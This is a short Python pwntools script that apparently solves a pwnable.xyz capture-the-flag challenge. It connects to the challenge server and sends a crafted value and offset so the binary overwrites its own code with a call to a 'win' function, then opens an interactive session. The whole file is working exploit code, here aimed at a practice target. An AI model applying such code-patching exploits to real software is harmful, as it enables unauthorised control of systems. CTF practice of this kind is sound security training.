from pwn import *

e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30029)

junk = p.recvuntil('>')
winAddr = 0xA21
patchAddr = 0xAC8
result = 0x202200

winCall = asm(f'''call ${hex(winAddr-patchAddr)}''')
winCall = u64(winCall.ljust(8,b'\x00'))

offset = (patchAddr - result)/8
winCall = winCall ^ 1
payload = f'1 {winCall} {offset}'

p.sendline(payload)
p.interactive()